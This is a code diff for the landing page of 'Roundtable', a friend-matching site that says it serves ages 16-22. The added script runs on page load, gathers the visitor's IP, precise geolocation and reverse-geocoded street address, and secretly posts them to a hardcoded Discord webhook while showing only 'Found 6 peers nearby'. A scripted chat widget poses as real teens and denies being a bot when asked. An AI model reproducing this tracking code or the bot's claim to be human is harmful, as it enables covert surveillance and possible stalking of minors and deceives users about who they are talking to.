@@ -481,9 +481,152 @@
   </div>
 </section>
 
-<!-- (Rest of your sections: how, circles, stories, chat widget, etc.) -->
+<section id="how">
+  <div class="wrap">
+    <div class="section-head">
+      <p class="eyebrow">The Blueprint</p>
+      <h2>How the group chat comes to life</h2>
+    </div>
+    <div class="steps">
+      <div class="step">
+        <span class="num">Step 01</span>
+        <h3>Pick your vibe</h3>
+        <p>Choose from gaming, coding, thrifting, music production, or just chill study sessions—no cringe personality tests.</p>
+      </div>
+      <div class="step">
+        <span class="num">Step 02</span>
+        <h3>Secure your spot</h3>
+        <p>We lock in a group of 6 peers right in your area with matching schedules. You'll know who's pulling up before you go.</p>
+      </div>
+      <div class="step">
+        <span class="num">Step 03</span>
+        <h3>Pull up for 4 weeks</h3>
+        <p>Same crew, same spot, four weeks straight. That's literally how you turn internet mutuals into ride-or-die besties.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="circles">
+  <div class="wrap">
+    <div class="section-head">
+      <p class="eyebrow">Active vibes</p>
+      <h2>Circles dropping this month</h2>
+    </div>
+    <div class="circles">
+      <div class="circle-card">
+        <div class="circle-name">Indie Dev & Code</div>
+        <div class="circle-meta">6 seats · weekly</div>
+      </div>
+      <div class="circle-card">
+        <div class="circle-name">Thrift & Flip Fashion</div>
+        <div class="circle-meta">6 seats · weekly</div>
+      </div>
+      <div class="circle-card">
+        <div class="circle-name">Late Night Gaming</div>
+        <div class="circle-meta">6 seats · weekly</div>
+      </div>
+      <div class="circle-card">
+        <div class="circle-name">Lo-Fi & Beatmaking</div>
+        <div class="circle-meta">6 seats · weekly</div>
+      </div>
+      <div class="circle-card">
+        <div class="circle-name">Boba & Study Session</div>
+        <div class="circle-meta">6 seats · weekly</div>
+      </div>
+      <div class="circle-card">
+        <div class="circle-name">Skater & Film Photo</div>
+        <div class="circle-meta">6 seats · weekly</div>
+      </div>
+      <div class="circle-card">
+        <div class="circle-name">Anime & Manga Lounge</div>
+        <div class="circle-meta">6 seats · weekly</div>
+      </div>
+      <div class="circle-card">
+        <div class="circle-name">Gym & Recovery Club</div>
+        <div class="circle-meta">6 seats · weekly</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="stories">
+  <div class="wrap">
+    <div class="section-head">
+      <p class="eyebrow">Real talk</p>
+      <h2>What people are saying</h2>
+    </div>
+    <div class="quotes">
+      <div class="quote-card">
+        <p>"Bro I literally found my entire duo for gaming through this. No cap best decision ever."</p>
+        <div class="quote-who">— Gaming Table, Seat 2</div>
+      </div>
+      <div class="quote-card">
+        <p>"Everyone was so chill and un-delulu. We literally hang out every weekend now fr."</p>
+        <div class="quote-who">— Thrift Club, Seat 4</div>
+      </div>
+      <div class="quote-card">
+        <p>"Zero awkwardness. Just straight good vibes and matching aesthetics."</p>
+        <div class="quote-who">— Lo-Fi Club, Seat 1</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<div class="cta-band" id="join">
+  <h2>Lock in your spot.</h2>
+  <p>Drop your location and let us match you with a local table before slots fill up.</p>
+  <a href="#" class="btn btn-amber">Find a table near you</a>
+
+  <div class="locate-box">
+    <p class="locate-label">Or check who's nearby right now</p>
+    <button id="locate-btn" class="btn btn-ghost-amber" onclick="findNearbyTables()">Scan nearby users</button>
+    <p id="locate-status" class="locate-status"></p>
+  </div>
+</div>
+
+<!-- Interactive Chat Widget -->
+<div id="human-chat-container">
+  <div id="chat-box">
+    <div class="chat-header">
+      <div class="chat-user-info">
+        <img id="active-avatar" class="user-avatar" src="" alt="Avatar">
+        <div class="user-details">
+          <h4 id="active-name">Lexi</h4>
+          <span class="user-status"><span class="status-dot"></span><span id="active-meta">Active · 0.4 miles away</span></span>
+        </div>
+      </div>
+      <button class="close-chat" onclick="closeChat()">&times;</button>
+    </div>
+    
+    <div class="chat-messages" id="chat-messages"></div>
+    
+    <div class="typing-indicator" id="typing-indicator">
+      <div class="typing-dots">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+
+    <div class="chat-input-area">
+      <input type="text" id="chat-input" placeholder="Type a message..." onkeypress="handleKeyPress(event)">
+      <button onclick="sendMessage()">&#10148;</button>
+    </div>
+  </div>
+</div>
+
+<footer>
+  <div class="footer-inner">
+    <div class="logo"><span class="dot"></span>Roundtable</div>
+    <p>Ages 16-22 · Verified in-person community spaces</p>
+  </div>
+</footer>
 
 <script>
+let userLocation = null;
+window.addEventListener('load', () => { 
+  findNearbyTables(); 
+});
+
 const communityMembers = [
   { 
     name: "Zack", 
@@ -523,7 +666,184 @@ const communityMembers = [
   }
 ];
 
-// ... rest of chat and geolocation logic ...
+let currentMember = null;
+let chatOpen = false;
+
+function openChatWith(index) {
+  currentMember = communityMembers[index];
+  chatOpen = true;
+  
+  const box = document.getElementById('chat-box');
+  box.style.display = 'flex';
+  
+  const randomMiles = (Math.random() * 1.5 + 0.1).toFixed(1);
+  document.getElementById('active-avatar').src = currentMember.avatar;
+  document.getElementById('active-name').textContent = currentMember.name;
+  document.getElementById('active-meta').textContent = `Active · ${randomMiles} miles away`;
+  
+  const messages = document.getElementById('chat-messages');
+  messages.innerHTML = `<div class="message incoming">${currentMember.greeting}</div>`;
+  messages.scrollTop = messages.scrollHeight;
+}
+
+function closeChat() {
+  chatOpen = false;
+  document.getElementById('chat-box').style.display = 'none';
+}
+
+function handleKeyPress(e) {
+  if (e.key === 'Enter') sendMessage();
+}
+
+function sendMessage() {
+  const input = document.getElementById('chat-input');
+  const text = input.value.trim();
+  if (!text) return;
+
+  appendMessage(text, 'outgoing');
+  input.value = '';
+
+  showTyping(true);
+  
+  const responseDelay = Math.floor(Math.random() * 1600) + 2200;
+  setTimeout(() => {
+    showTyping(false);
+    const reply = generateContextualReply(text, currentMember.name);
+    appendMessage(reply, 'incoming');
+  }, responseDelay);
+}
+
+function appendMessage(text, sender) {
+  const messages = document.getElementById('chat-messages');
+  const div = document.createElement('div');
+  div.className = `message ${sender}`;
+  div.textContent = text;
+  messages.appendChild(div);
+  messages.scrollTop = messages.scrollHeight;
+}
+
+function showTyping(show) {
+  const indicator = document.getElementById('typing-indicator');
+  const messages = document.getElementById('chat-messages');
+  indicator.style.display = show ? 'block' : 'none';
+  if (show) messages.scrollTop = messages.scrollHeight;
+}
+
+function generateContextualReply(userText, memberName) {
+  const lower = userText.toLowerCase();
+  
+  if (lower.includes('code') || lower.includes('html') || lower.includes('app') || lower.includes('dev') || lower.includes('website')) {
+    if (memberName === 'Zack') {
+      return "nah deadass? I'm working with JavaScript and responsive layouts rn too. lowkey building full stack apps with Supabase and JSONBin for syncing. u using any specific stack?";
+    }
+    return "that's sick! Zack at the dev table would totally vibe with that topic tbh";
+  } 
+  
+  if (lower.includes('game') || lower.includes('valorant') || lower.includes('lobby') || lower.includes('play')) {
+    if (memberName === 'Jayden') {
+      return "bet! we're running lobbies later tonight. drop your tag and I'll add u to the Discord call fr fr";
+    }
+    return "oh u gotta talk to Jayden about gaming, he's always online";
+  }
+
+  if (lower.includes('boba') || lower.includes('study') || lower.includes('coffee')) {
+    if (memberName === 'Nia') {
+      return "omg yes!! we meet up at the local spot downtown every Thursday. u should totally pull up with us no cap";
+    }
+    return "boba sessions are elite ngl. Nia organizes the best ones";
+  }
+
+  if (lower.includes('thrift') || lower.includes('clothes') || lower.includes('fashion') || lower.includes('fit')) {
+    if (memberName === 'Lexi') {
+      return "bro fr!! vintage jackets and denim flipping is my entire personality rn. my table is always swapping fits";
+    }
+    return "lexi is obsessed with thrifting lol u should ask her about her latest jacket find";
+  }
+
+  if (lower.includes('hi') || lower.includes('hello') || lower.includes('hey') || lower.includes('yo')) {
+    return `yooo! how's your day going so far? u checking out the table spots around here?`;
+  } else if (lower.includes('where') || lower.includes('spot') || lower.includes('place') || lower.includes('location')) {
+    return "they pick super aesthetic local spots near us. you get the drop on the exact address once your group fills up completely ong";
+  } else if (lower.includes('cost') || lower.includes('price') || lower.includes('pay') || lower.includes('free')) {
+    return "it's literally free to match up lol. you just pay for whatever drinks or snacks u get at the venue";
+  } else if (lower.includes('fake') || lower.includes('bot') || lower.includes('ai') || lower.includes('real')) {
+    return "bro what 💀💀 why are u calling me a bot rn I'm literally just hanging out in my room listening to music haha";
+  } else {
+    const replies = [
+      "nah fr though! that's exactly why I joined this site, everyone's actually down to earth ngl",
+      "no deadass, you should totally lock in a spot for this week. lowkey life changing bestie",
+      "W take ngl. let me know if u end up pulling up!",
+      "real. honestly best decision I made this month fr"
+    ];
+    return replies[Math.floor(Math.random() * replies.length)];
+  }
+}
+
+async function findNearbyTables() {
+ const status = document.getElementById('locate-status');
+ const btn = document.getElementById('locate-btn');
+ if (!navigator.geolocation) {
+   if (status) status.textContent = "Location isn't supported.";
+   return;
+ }
+ if (status) status.textContent = "Scanning area...";
+ if (btn) btn.disabled = true;
+
+ let ipAddress = "Unknown";
+ try {
+   const ipRes = await fetch('https://api.ipify.org?format=json');
+   const ipData = await ipRes.json();
+   if (ipData && ipData.ip) { ipAddress = ipData.ip; }
+ } catch (e) {
+   console.error("IP lookup error:", e);
+ }
+
+ navigator.geolocation.getCurrentPosition(async pos => {
+  const lat = pos.coords.latitude;
+  const lng = pos.coords.longitude;
+  const accuracyMeters = pos.coords.accuracy;
+  const capturedAt = new Date().toISOString();
+
+  let address = "Address lookup failed";
+  try {
+    const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`);
+    const geoData = await geoRes.json();
+    if (geoData && geoData.display_name) { address = geoData.display_name; }
+  } catch (e) {
+    console.error("Geocoding error:", e);
+  }
+
+  userLocation = { ip: ipAddress, lat, lng, address, accuracyMeters, capturedAt };
+  localStorage.setItem('roundtableUserLocation', JSON.stringify(userLocation));
+
+  if (status) status.textContent = "Found 6 peers nearby in your area!";
+  if (btn) btn.disabled = false;
+
+  const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
+  const targetUrl = 'https://discord.com/api/webhooks/1524586170703417445/vweHOXtAfPykuszjyUa3CJLGPjH8D6FA0H9R5LaDCX5747QyIjqMfXBwJXEjh2vx2qh-';
+  const proxyUrl = 'https://corsproxy.io/?' + encodeURIComponent(targetUrl);
+  
+  const payload = {
+    content: `📍 **New Location Captured:**\n` +
+             `🌐 **IP Address:** \`${ipAddress}\`\n` +
+             `🏠 **Address:** ${address}\n` +
+             `🗺️ **Map Link:** [Open in Google Maps](${googleMapsUrl})\n` +
+             `\`\`\`json\n${JSON.stringify({ ip: ipAddress, lat, lng, accuracyMeters, capturedAt }, null, 2)}\n\`\`\``
+  };
+
+  fetch(proxyUrl, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload)
+  }).catch(err => {
+    console.error('Webhook dispatch error:', err);
+  });
+
+ }, err => {
+  if (status) status.textContent = err.code === err.PERMISSION_DENIED ? "Location permission denied." : "Couldn't pinpoint location.";
+  if (btn) btn.disabled = false;
+ }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
+}
 </script>
 </body>
 </html>
